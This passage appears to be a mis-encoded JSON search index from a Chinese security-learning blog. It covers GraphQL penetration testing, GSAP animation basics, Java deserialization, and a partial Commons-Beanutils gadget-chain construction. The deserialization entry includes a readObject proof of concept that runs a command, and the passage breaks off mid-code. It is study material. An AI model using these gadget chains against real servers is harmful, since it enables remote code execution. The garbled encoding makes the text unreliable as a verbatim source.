æœåŠ¡ç«¯è§£æ â†’ æ•°æ®åº“æŸ¥è¯¢ï¼ˆå¯èƒ½å«SQLæ‹¼æ¥ï¼‰ â†’ æ•°æ®åº“æ‰§è¡Œ é‚£ä¹ˆå¾ˆæ˜æ˜¾äº†ï¼Œå¦‚æœæœåŠ¡ç«¯åœ¨å¤„ç† GraphQL å‚æ•°æ—¶ç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ï¼Œå¯èƒ½è§¦å‘ SQL æ³¨å…¥\nåŒç†ï¼Œè¿™ç±»ä¼ ç»Ÿæ¼æ´éƒ½æœ‰å¯èƒ½å­˜åœ¨æ¯”å¦‚ï¼šä»£ç æ‰§è¡Œã€å‘½ä»¤æ‰§è¡Œã€XSSã€SSRFã€ä»»æ„æ–‡ä»¶è¯»å–ç­‰\nå†è€…ï¼Œä¹Ÿæœ‰å¯èƒ½ä½¿ç”¨æ‰¹é‡/é€’å½’/é‡å¤æŸ¥è¯¢è¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»åˆ©ç”¨\nç›¸å…³å·¥å…·çš„å‰ç«¯æ¼æ´ GraphiQLï¼ˆä¸€ä¸ªæµè§ˆå™¨GraphQLå®¢æˆ·ç«¯ï¼Œçº¯å‰ç«¯åº”ç”¨ï¼‰åŠä½¿ç”¨å…¶çš„Graphene-Djangoæ¡†æ¶å¯èƒ½ä¼šäº§ç”Ÿä¸€äº›å‰ç«¯æ¼æ´æ¯”å¦‚CSRFã€click hijackingç­‰ï¼Œå¯ä»¥è‡ªè¡Œäº†è§£è¯¦æƒ…\næ€»ç»“ GraphQLç®—æ˜¯ä¸€ä¸ªå›½å†…å¤–æ¯”è¾ƒå¸¸è§çš„APIäº†ï¼Œæ³„æ¼ã€æ³¨å…¥ã€æœªæˆæƒçš„æµ‹è¯•éƒ½æ¯”è¾ƒæ–¹ä¾¿ï¼Œåœ¨SRCä¸­å¯ä»¥å¤šåŠ å…³æ³¨\n",
        "summary": "æµ…è°ˆGraphQLæ¸—é€æµ‹è¯• å‰ç½®çŸ¥è¯† GraphQLæ¦‚å¿µ GraphQLæ˜¯ä¸€ä¸ªç”¨äº APIçš„æŸ¥è¯¢è¯­è¨€ï¼Œä¸‹é¢æˆ‘ç”¨é€šä¿—çš„è¯­è¨€æ¥è°ˆè°ˆå®ƒçš„ç‰¹ç‚¹ï¼š\nç®€å•è¯´ï¼ŒGraphQL æ˜¯ä¸€ç§â€œçµæ´»å–æ•°æ®â€çš„å·¥å…·ã€‚æ¯”å¦‚ä½ ç‚¹å¤–å–æ—¶ï¼Œå¯ä»¥è‡ªç”±ç»„åˆèœå“ï¼Œè€Œä¸ç”¨æŒ‰å›ºå®šå¥—é¤ç‚¹ã€‚GraphQL çš„ä½œç”¨ç±»ä¼¼ï¼šå‰ç«¯å¯ä»¥æŒ‰éœ€â€œç‚¹â€æ•°æ®ï¼Œåç«¯ç²¾å‡†è¿”å›\né‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥çœ‹å‡ºGraphQLä¸ä¼ ç»ŸRest APIçš„åŒºåˆ«äº†ï¼Œæˆ‘ä»¬åŒæ ·ä»¥â€ç‚¹å¤–å–â€œæ¥æè¿°ï¼š\nRest APIï¼šå›ºå®šå¥—é¤ï¼Œæ¯”å¦‚\nå¥—é¤Aï¼šç”¨æˆ·ä¿¡æ¯ï¼ˆå§“åã€å¤´åƒï¼‰ å¥—é¤Bï¼šç”¨æˆ·çš„æœ‹å‹åˆ—è¡¨ å¥—é¤Cï¼šç”¨æˆ·çš„è®¢å•è®°å½• é‚£ä¹ˆå¯ä»¥çœ‹å‡ºæ¥å®ƒçš„å±€é™ï¼šå¦‚æœä½ æƒ³åŒæ—¶è¦â€œç”¨æˆ·å§“åâ€å’Œâ€œæœ‹å‹åˆ—è¡¨â€ï¼Œå¾—ç‚¹ä¸¤æ¬¡å¥—é¤ï¼ˆå‘ä¸¤æ¬¡è¯·æ±‚ï¼‰ï¼Œæˆ–è€…è®©åç«¯ä¸´æ—¶åšä¸ªæ–°å¥—é¤ï¼ˆæ”¹æ¥å£ï¼‰\nGraphQLï¼šè‡ªåŠ©é¤ï¼Œæƒ³è¦ä»€ä¹ˆç›´æ¥é€šè¿‡æ¥å£å‘Šè¯‰åç«¯ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªè¯·æ±‚ï¼š\nquery { user { name # åªè¦å§“å friends { # å’Œæœ‹å‹åˆ—è¡¨ name } } } è¿™ä¸ªè¯·æ±‚èƒ½å¤Ÿï¼Œä¸€æ¬¡ç²¾å‡†æ‹¿åˆ° name å’Œ friends æ•°æ®ï¼Œä¸ä¼šå¤šæ‹¿ï¼ˆæ¯”å¦‚ä¸éœ€è¦å¤´åƒï¼‰ï¼Œä¹Ÿä¸ä¼šå°‘æ‹¿\né€šè¿‡ä¸Šé¢çš„æè¿°ï¼Œæˆ‘ä»¬èƒ½å¤ŸçŸ¥é“GraphQL APIä¸Rest APIæœ€å¤§çš„åŒºåˆ«ï¼šGraphQL é€šè¿‡å°†æ•°æ®æŸ¥è¯¢å’Œæ•°æ®ä¿®æ”¹åˆ†ç¦»å¼€æ¥ï¼Œä½¿å¾—å®¢æˆ·ç«¯èƒ½å¤Ÿæ›´çµæ´»åœ°æ§åˆ¶æ‰€éœ€æ•°æ®çš„ç²’åº¦å’Œç±»å‹ï¼Œå¹¶ä¸”åœ¨å¤šä¸ªèµ„æºä¹‹é—´å»ºç«‹å…³ç³»\nGraphQLæŸ¥è¯¢æ–¹å¼ æŸ¥è¯¢æ–¹å¼ä¸»è¦æœ‰ï¼š\nQuery Mutation Subscription Input Enum Union Interface æœ€å¸¸è§çš„æ˜¯Queryã€Mutationã€Subscriptionä¸‰ç§ï¼Œè¿™é‡Œç®€å•ä¸¾ä¾‹ï¼š\nQueryï¼ˆæŸ¥è¯¢ï¼‰ ç”¨äºè·å–æ•°æ®ï¼Œåªè¯»å–ä¸ä¿®æ”¹ï¼š\nquery æ“ä½œåç§°(å¯é€‰å‚æ•°) { å­—æ®µå(å‚æ•°) { å­å­—æ®µ } } Mutationï¼ˆå˜æ›´ï¼‰ ç”¨äºä¿®æ”¹æ•°æ®ï¼Œå±äºå†™æ“ä½œï¼Œä¼šæ”¹å˜æœåŠ¡å™¨çŠ¶æ€ï¼š\n"
    }
,
    {
        "title": "GSAPå­¦ä¹ ",
        "link": "/My-Knowlege-Database/blog/%E5%89%8D%E7%AB%AF/gsap%E5%AD%A6%E4%B9%A0/",
        "content": "GSAPå­¦ä¹  ç®€å•æ¥è¯´ï¼ŒGSAPæ˜¯ä¸€ä¸ªåŠ¨ç”»åº“ï¼Œå®ç”¨æ€§å¾ˆé«˜ï¼Œä¸€å­—å¸…ï¼Œæ¥ä¸‹æ¥å¼€å§‹å­¦ä¹ \nåŸºæœ¬ä½¿ç”¨ åˆ›å»ºåŠ¨ç”» å…ˆç»™boxæ¥ä¸ªåŠ¨ç”»ï¼š\ngsap.to(\u0026#34;.box\u0026#34;, { x: 200 }) è¿™ä¸ªåŠ¨ç”»å«tweenï¼Œå¤§æ„æ˜¯è®©gsapæŠŠå¸¦æœ‰.boxç±»åçš„å…ƒç´ ç§»åŠ¨åˆ°xä¸º200çš„ä½ç½®ï¼ˆå’Œtransfromï¼štranslateX(200px)å·®ä¸å¤šï¼‰\nTweenå…¶å®æ˜¯ä¸€ç§åŠ¨ç”»çš„ç±»å‹ï¼Œä¸­æ–‡ä¸€èˆ¬ç¿»è¯‘å«åšè¡¥é—´åŠ¨ç”»ï¼Œå°±æ˜¯æˆ‘ä»¬å¸¸è§çš„ä¸¤ä¸ªçŠ¶æ€ä¹‹é—´çš„å˜åŒ–çš„åŠ¨ç”»æ–¹å¼ï¼Œä¸­é—´çš„å˜åŒ–è¿‡ç¨‹éƒ½æ˜¯è®¡ç®—æœºè®¡ç®—å‡ºæ¥çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„åŒ€é€Ÿã€ç¼“å…¥ç¼“å‡ºåŠ¨ç”»å°±æ˜¯Tweenç±»å‹çš„åŠ¨ç”»ã€‚\nå…ˆæ¥ä¸ªdemoï¼š\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;GSAP åŠ¨ç”»ç¤ºä¾‹\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { display: flex; align-items: center; justify-content: flex-start; min-height: 100vh; margin: 0; overflow: hidden; background-color: black; } .box { width: 100px; height: 100px; display: block; border-radius: 10px; background-color: #53f863; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;box green\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;!-- å¼•å…¥ GSAP åŠ¨ç”»åº“ --\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; gsap.to(\u0026#34;.box\u0026#34;, { x: 200, }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å¯ä»¥çœ‹çœ‹æ•ˆæœ:\næ¥ä¸‹æ¥ä»”ç»†åˆ†æè¿™ä¸ªè¯­æ³•ï¼š è¿™ä¸ªä»£ç ä¸­æœ‰ä¸‰ä¸ªä¸œè¥¿ï¼š\næ–¹æ³•method ç›®æ ‡target å¯¹è±¡æ•°æ®variables æ¥ä¸‹æ¥è¯¦ç»†çœ‹çœ‹è¿™ä¸ªä¸‰ä¸ªéƒ¨åˆ†\nåŠ¨ç”»æ–¹æ³•method tweençš„åŠ¨ç”»æ–¹å¼æœ‰4ç§ï¼š\ngsap.to() æœ€å¸¸è§çš„åŠ¨ç”»ï¼Œä»åˆå§‹çŠ¶æ€å˜åŒ–åˆ°ç›®æ ‡çŠ¶æ€ gsap.from() åè¿‡æ¥ï¼Œä»ç›®æ ‡çŠ¶æ€å˜ä¸ºåˆå§‹çŠ¶æ€ grap.fromTo() è‡ªå®šä¹‰ä¸¤ä¸ªçŠ¶æ€ï¼Œä»å‰ä¸€ä¸ªå˜åˆ°åä¸€ä¸ª gsap.set() ç›´æ¥å˜ä¸ºç›®æ ‡çŠ¶æ€ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ¸¡åŠ¨ç”» å¯ä»¥å†™demoä½“éªŒä¸€ä¸‹ï¼š\ngsap.to\ngsap.to(\u0026#34;.box\u0026#34;, { x: 200, backgroundColor: \u0026#39;#1fa7d4\u0026#39;, }); gasp.from\ngsap.from(\u0026#34;.box\u0026#34;, { x: -200, backgroundColor: \u0026#39;#1fa7d4\u0026#39;, }); gsap.fromTo\ngsap.fromTo(\u0026#34;.box\u0026#34;, { x: -100,cfd2 backgroundColor: \u0026#39;#53f863\u0026#39;, }, { x: 100, backgroundColor: \u0026#39;#1fa7d4\u0026#39;, }); gsap.set\ngsap.set(\u0026#34;.box\u0026#34;,{ x: 200, backgroundColor: \u0026#39;#1fa7d4\u0026#39;, }); ç›®æ ‡å…ƒç´ target ç”¨æ¥å‘GSAPæŒ‡å®šå˜åŒ–çš„å…ƒç´ \nGSAPåœ¨åº•å±‚å®é™…ä¸Šæ˜¯ä½¿ç”¨äº†document.querySelector( )å»é€‰æ‹©å…ƒç´ ï¼Œæ‰€ä»¥ä½ å¯ä»¥ç”¨ä»»ä½•cssé€‰æ‹©å™¨è¿›è¡Œå…ƒç´ çš„é€‰æ‹©ã€‚æˆ–è€…ä½ ä¹Ÿå¯ä»¥ç›´æ¥ä¼ å…¥ä¸€ä¸ªDOMå…ƒç´ æˆ–è€…ä¸€ä¸ªæ•°ç»„:\n// ä½¿ç”¨ç±»åæˆ–è€…idåï¼Œå…¶å®cssé€‰æ‹©å™¨éƒ½å¯ä»¥ gsap.to(\u0026#34;.box\u0026#34;, { x: 200 }); // å¤æ‚ä¸€äº›çš„cssé€‰æ‹©å™¨ gsap.to(\u0026#34;section \u0026gt; .box\u0026#34;, { x: 200 }); // ä¸€ä¸ªå˜é‡ï¼Œå…¶å®æ˜¯æŠŠè·å–åˆ°çš„DOMå…ƒç´ ç›´æ¥ä¼ è¿›å» let box = document.querySelector(\u0026#34;.box\u0026#34;); gsap.to(box, { x: 200 }) // å¯ä»¥æŠŠdomå…ƒç´ æ”¾åˆ°æ•°ç»„é‡Œé¢ä¸€èµ·ä¼ å…¥ let square = document.querySelector(\u0026#34;.square\u0026#34;); let circle = document.querySelector(\u0026#34;.circle\u0026#34;); gsap.to([square, circle], { x: 200 }) å˜åŒ–æ•°æ®å¯¹è±¡variables è®¾ç½®ä¸€äº›åŠ¨ç”»å˜åŒ–ç›¸å…³çš„ä¿¡æ¯ï¼Œæ¯”å¦‚durationåŠ¨ç”»æ—¶å¸¸ã€onCompleteåŠ¨ç”»å®Œæˆæ—¶çš„è§¦å‘äº‹ä»¶ã€repeatåŠ¨ç”»é‡å¤æ¬¡æ•°\n",
        "summary": "GSAPå­¦ä¹  ç®€å•æ¥è¯´ï¼ŒGSAPæ˜¯ä¸€ä¸ªåŠ¨ç”»åº“ï¼Œå®ç”¨æ€§å¾ˆé«˜ï¼Œä¸€å­—å¸…ï¼Œæ¥ä¸‹æ¥å¼€å§‹å­¦ä¹ \nåŸºæœ¬ä½¿ç”¨ åˆ›å»ºåŠ¨ç”» å…ˆç»™boxæ¥ä¸ªåŠ¨ç”»ï¼š\ngsap.to(\u0026#34;.box\u0026#34;, { x: 200 }) è¿™ä¸ªåŠ¨ç”»å«tweenï¼Œå¤§æ„æ˜¯è®©gsapæŠŠå¸¦æœ‰.boxç±»åçš„å…ƒç´ ç§»åŠ¨åˆ°xä¸º200çš„ä½ç½®ï¼ˆå’Œtransfromï¼štranslateX(200px)å·®ä¸å¤šï¼‰\nTweenå…¶å®æ˜¯ä¸€ç§åŠ¨ç”»çš„ç±»å‹ï¼Œä¸­æ–‡ä¸€èˆ¬ç¿»è¯‘å«åšè¡¥é—´åŠ¨ç”»ï¼Œå°±æ˜¯æˆ‘ä»¬å¸¸è§çš„ä¸¤ä¸ªçŠ¶æ€ä¹‹é—´çš„å˜åŒ–çš„åŠ¨ç”»æ–¹å¼ï¼Œä¸­é—´çš„å˜åŒ–è¿‡ç¨‹éƒ½æ˜¯è®¡ç®—æœºè®¡ç®—å‡ºæ¥çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„åŒ€é€Ÿã€ç¼“å…¥ç¼“å‡ºåŠ¨ç”»å°±æ˜¯Tweenç±»å‹çš„åŠ¨ç”»ã€‚\nå…ˆæ¥ä¸ªdemoï¼š\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;GSAP åŠ¨ç”»ç¤ºä¾‹\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { display: flex; align-items: center; justify-content: flex-start; min-height: 100vh; margin: 0; overflow: hidden; background-color: black; } .box { width: 100px; height: 100px; display: block; border-radius: 10px; background-color: #53f863; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;box green\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;!-- å¼•å…¥ GSAP åŠ¨ç”»åº“ --\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; gsap.to(\u0026#34;.box\u0026#34;, { x: 200, }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å¯ä»¥çœ‹çœ‹æ•ˆæœ:\næ¥ä¸‹æ¥ä»”ç»†åˆ†æè¿™ä¸ªè¯­æ³•ï¼š è¿™ä¸ªä»£ç ä¸­æœ‰ä¸‰ä¸ªä¸œè¥¿ï¼š\næ–¹æ³•method ç›®æ ‡target å¯¹è±¡æ•°æ®variables æ¥ä¸‹æ¥è¯¦ç»†çœ‹çœ‹è¿™ä¸ªä¸‰ä¸ªéƒ¨åˆ†\nåŠ¨ç”»æ–¹æ³•method tweençš„åŠ¨ç”»æ–¹å¼æœ‰4ç§ï¼š\ngsap.to() æœ€å¸¸è§çš„åŠ¨ç”»ï¼Œä»åˆå§‹çŠ¶æ€å˜åŒ–åˆ°ç›®æ ‡çŠ¶æ€ gsap.from() åè¿‡æ¥ï¼Œä»ç›®æ ‡çŠ¶æ€å˜ä¸ºåˆå§‹çŠ¶æ€ grap.fromTo() è‡ªå®šä¹‰ä¸¤ä¸ªçŠ¶æ€ï¼Œä»å‰ä¸€ä¸ªå˜åˆ°åä¸€ä¸ª gsap.set() ç›´æ¥å˜ä¸ºç›®æ ‡çŠ¶æ€ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ¸¡åŠ¨ç”» å¯ä»¥å†™demoä½“éªŒä¸€ä¸‹ï¼š\n"
    }
,
    {
        "title": "javaååºåˆ—åŒ–",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
        "content": "javaååºåˆ—åŒ– åºåˆ—åŒ–ä¸ååºåˆ—åŒ– æ–¹ä¾¿å¯¹è±¡ä¼ è¾“ï¼Œå¯¹è±¡ä¸åºåˆ—åŒ–å­—ç¬¦ä¸²çš„è½¬æ¢\ndemo personç±»\npackage com.yuy0ung.fundamentals; import java.io.Serializable; public class Person implements Serializable { private String name; private int age; public Person() { } public Person(String name, int age) { this.name = name; this.age = age; } @Override public String toString() { return \u0026#34;Person [name=\u0026#34; + name + \u0026#34;, age=\u0026#34; + age + \u0026#34;]\u0026#34;; } } åºåˆ—åŒ–ï¼š\npackage com.yuy0ung.fundamentals; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; public class SerializationTest { public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static void main(String[] args) throws IOException { Person person = new Person(\u0026#34;aa\u0026#34;, 22); // System.out.println(person); serialize(person); } } ååºåˆ—åŒ–ï¼š\npackage com.yuy0ung.fundamentals; import java.io.FileInputStream; import java.io.IOException; import java.io.ObjectInputStream; public class UnserializeTest { public static Object unserrialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\u0026#34;ser.bin\u0026#34;)); Object obj = ois.readObject(); return obj; } public static void main(String[] args) throws IOException, ClassNotFoundException { Person person = (Person) unserrialize(\u0026#34;ser.bin\u0026#34;); System.out.println(person); } } ä¸ºä»€ä¹ˆä¼šæœ‰ä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼š\nå› ä¸ºåªè¦æœåŠ¡ç«¯ååºåˆ—åŒ–æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¼ é€’ç±»çš„readObjectä¸­ä»£ç ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œæ”»å‡»è€…å°±å¯ä»¥åœ¨æœåŠ¡å™¨è¿è¡Œä»£ç \n1.å…¥å£ç±»çš„readObjectç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•ã€‚ 2.å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObjectæ—¶è°ƒç”¨ã€‚ 3.å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObjectæ—¶è°ƒç”¨ã€‚ æ¯”å¦‚ç±»å‹å®šä¹‰ä¸ºObjectï¼Œ è°ƒç”¨ Mequals/hashcode/toString é‡ç‚¹ ç›¸åŒç±»å‹ åŒåå‡½æ•° 4.æ„é€ å‡½æ•°/é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œã€‚\nååºåˆ—åŒ–åŸºç¡€åˆ©ç”¨æ¡ä»¶ï¼š\nç»§æ‰¿serializable\nå…¥å£ç‚¹ sourceï¼ˆé‡å†™readObject å‚æ•°ç±»å‹å®½æ³› æœ€å¥½jdkè‡ªå¸¦ï¼‰\nè°ƒç”¨é“¾ gadget chain\næ‰§è¡Œç±» sink ï¼ˆrceã€ssrfã€å†™æ–‡ä»¶ç­‰ï¼‰\nå¯ä»¥é‡å†™personç±»çš„readObjectæ–¹æ³•æ¥éªŒè¯:\npackage com.yuy0ung.fundamentals; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; public class Person implements Serializable { private String name; private int age; public Person() { } public Person(String name, int age) { this.name = name; this.age = age; } @Override public String toString() { return \u0026#34;Person [name=\u0026#34; + name + \u0026#34;, age=\u0026#34; + age + \u0026#34;]\u0026#34;; } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ois.defaultReadObject(); Runtime.getRuntime().exec(\u0026#34;open -a calculator\u0026#34;); } } åºåˆ—åŒ–ç„¶åååºåˆ—åŒ–å°±ä¼šå¼¹è®¡ç®—å™¨\n",
        "summary": "javaååºåˆ—åŒ– åºåˆ—åŒ–ä¸ååºåˆ—åŒ– æ–¹ä¾¿å¯¹è±¡ä¼ è¾“ï¼Œå¯¹è±¡ä¸åºåˆ—åŒ–å­—ç¬¦ä¸²çš„è½¬æ¢\ndemo personç±»\npackage com.yuy0ung.fundamentals; import java.io.Serializable; public class Person implements Serializable { private String name; private int age; public Person() { } public Person(String name, int age) { this.name = name; this.age = age; } @Override public String toString() { return \u0026#34;Person [name=\u0026#34; + name + \u0026#34;, age=\u0026#34; + age + \u0026#34;]\u0026#34;; } } åºåˆ—åŒ–ï¼š\n"
    }
,
    {
        "title": "Javaååºåˆ—åŒ–-CBé“¾",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cb%E9%93%BE/",
        "content": "javaååºåˆ—åŒ–-CBé“¾ ä»Šå¤©å­¦å­¦CBé“¾ï¼Œåœ¨CC2ä¸­æˆ‘ä»¬æ˜¯é è§¦å‘Comparatorçš„compareæ¥è¿›è¡Œååºåˆ—åŒ–è°ƒç”¨ï¼Œè¿˜æœ‰æ²¡æœ‰ç±»ä¼¼çš„è°ƒç”¨é“¾å‘¢\nApache Commons Beanutils Apache Commons Beanutils æ˜¯ Apache Commons å·¥å…·é›†ä¸‹çš„å¦ä¸€ä¸ªé¡¹ç›®ï¼Œå®ƒæä¾›äº†å¯¹æ™®é€šJavaç±»å¯¹è±¡ï¼ˆä¹Ÿç§°ä¸ºJavaBeanï¼‰çš„ä¸€äº›æ“ä½œæ–¹æ³•\nç®€å•æ¥çœ‹ï¼Œjava beanå°±æ˜¯ä¸€ä¸ªå±æ€§ç§æœ‰ã€æœ‰getterå’Œsetterçš„ç±»ï¼Œé£æ ¼å’Œæˆ‘ä»¬ç†Ÿæ‚‰çš„é¢å‘å¯¹è±¡å·®åˆ«ä¸å¤§\næ¯”å¦‚è¿™ä¸ªç±»D0g3erï¼Œå…¶ä¸­getterçš„æ–¹æ³•åä»¥getå¼€å¤´ï¼Œsetterçš„æ–¹æ³•åä»¥setå¼€å¤´ï¼Œå…¨åç¬¦åˆéª†é©¼å¼å‘½åæ³•ï¼ˆCamel-Caseï¼‰ï¼š\npackage com.yuy0ung; public class D0g3er { private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } } commons-beanutilsä¸­æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³• PropertyUtils.getProperty ï¼Œè®©ä½¿ç”¨è€…å¯ä»¥ç›´æ¥è°ƒç”¨ä»»æ„JavaBeançš„getteræ–¹æ³•ï¼Œæ¯”å¦‚è¿™æ ·ï¼š\npackage com.yuy0ung; import org.apache.commons.beanutils.PropertyUtils; import java.lang.reflect.InvocationTargetException; public class TestPropertyUtils { public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException { D0g3er Yuy0ung = new D0g3er(); Yuy0ung.setName(\u0026#34;Yuy0ung\u0026#34;); String name = (String) PropertyUtils.getProperty(Yuy0ung,\u0026#34;name\u0026#34;); System.out.println(name); } } æ­¤æ—¶ï¼Œcommons-beanutilsä¼šè‡ªåŠ¨æ‰¾åˆ°nameå±æ€§çš„getteræ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ getName ï¼Œç„¶åè°ƒç”¨ï¼Œè·å¾—è¿”å›å€¼ï¼š\né™¤æ­¤ä¹‹å¤–ï¼Œ PropertyUtils.getProperty è¿˜æ”¯æŒé€’å½’è·å–å±æ€§ï¼Œæ¯”å¦‚aå¯¹è±¡ä¸­æœ‰å±æ€§bï¼Œbå¯¹è±¡ä¸­æœ‰å±æ€§cï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ PropertyUtils.getProperty(a, \u0026ldquo;b.c\u0026rdquo;); çš„æ–¹å¼è¿›è¡Œé€’å½’è·å–ã€‚é€šè¿‡è¿™ä¸ªæ–¹æ³•ï¼Œä½¿ç”¨è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è°ƒç”¨ä»»æ„å¯¹è±¡çš„getterï¼Œé€‚ç”¨äºåœ¨ä¸ç¡®å®šJavaBeanæ˜¯å“ªä¸ªç±»å¯¹è±¡æ—¶ä½¿ç”¨\ngetterçš„åˆ©ç”¨ æ¥ä¸‹æ¥æˆ‘ä»¬è¿˜æ˜¯å°è¯•å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„java.util.Comparatorå¯¹è±¡ï¼Œå¾ˆå·§çš„æ˜¯ï¼Œåœ¨Commons Beanutilsä¸­å°±æœ‰ä¸€ä¸ªç°æˆçš„org.apache.commons.beanutils.BeanComparatorï¼Œå®ƒæ˜¯commons-beanutilsæä¾›çš„ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªJavaBeanæ˜¯å¦ç›¸ç­‰çš„ç±»ï¼Œå…¶å®ç°äº†java.util.Comparator æ¥å£\næˆ‘ä»¬å¯ä»¥çœ‹çœ‹ä»–çš„compareæ–¹æ³•ï¼š\né€»è¾‘å¾ˆæ¸…æ™°ï¼šè¿™ä¸ªæ–¹æ³•ä¼ å…¥ä¸¤ä¸ªå¯¹è±¡ï¼Œå¦‚æœ this.property ä¸ºç©ºï¼Œåˆ™ç›´æ¥æ¯”è¾ƒè¿™ä¸¤ä¸ªå¯¹è±¡ï¼›å¦‚æœ this.property ä¸ä¸ºç©ºï¼Œåˆ™ç”¨ PropertyUtils.getProperty åˆ†åˆ«å–è¿™ä¸¤ä¸ªå¯¹è±¡çš„ this.property å±æ€§ï¼Œæ¯”è¾ƒå±æ€§çš„å€¼\næˆ‘ä»¬çŸ¥é“PropertyUtils.getPropertyå¯ä»¥è°ƒç”¨ä»»æ„JavaBeançš„getteræ–¹æ³•ï¼Œæ‰€ä»¥æ­¤å¤„æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªèƒ½å¤Ÿæ‰§è¡Œæ¶æ„ä»£ç çš„getterï¼Œæˆ‘ä»¬åœ¨åˆ†æTemplatesImplåŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ—¶å€™ï¼Œæœ‰è¿™ä¹ˆä¸€ä¸ªè°ƒç”¨é“¾ï¼š\nTemplatesImpl#getOutputProperties() TemplatesImpl#newTransformer() TemplatesImpl#getTransletInstance() TemplatesImpl#defineTransletClasses() TransletClassLoader#defineClass() æˆ‘ä»¬æ³¨æ„åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªèƒ½å¤Ÿè¢«å¤–éƒ¨è°ƒç”¨çš„æ–¹æ³•getOutputProperties()ï¼Œå¹¶ä¸”å®ƒæ˜¯ä¸€ä¸ªgetter\nå›åˆ°ä¸Šé¢çš„PropertyUtils.getProperty( o1, property ) è¿™æ®µä»£ç ï¼Œå½“o1æ˜¯ä¸€ä¸ª TemplatesImpl å¯¹è±¡ï¼Œè€Œ property çš„å€¼ä¸º outputProperties æ—¶ï¼Œå°†ä¼šè‡ªåŠ¨è°ƒç”¨getterï¼Œä¹Ÿå°±æ˜¯TemplatesImpl#getOutputProperties() æ–¹æ³•ï¼Œè§¦å‘ä»£ç æ‰§è¡Œ\næ¥ä¸‹æ¥å°±å¯ä»¥ç€æ‰‹æ„é€ äº†\næ„é€  ä¸»è¦æ˜¯è§¦å‘ç‚¹çš„æ„é€ ï¼Œå…ˆå®ä¾‹åŒ–BeanComparatorï¼Œç„¶åç”¨è¿™ä¸ªcomparatorå®ä¾‹åŒ–ä¼˜å…ˆé˜Ÿåˆ— PriorityQueueï¼Œæ¶æ„å¯¹è±¡ä»ç„¶é€šè¿‡åå°„å»è®¾ç½®ï¼š\nBeanComparator bc = new BeanComparator(); PriorityQueue pq = new PriorityQueue(2, bc); pq.add(1); pq.add(1); setFieldValue(bc, \u0026#34;property\u0026#34;, \u0026#34;outputProperties\u0026#34;); setFieldValue(pq, 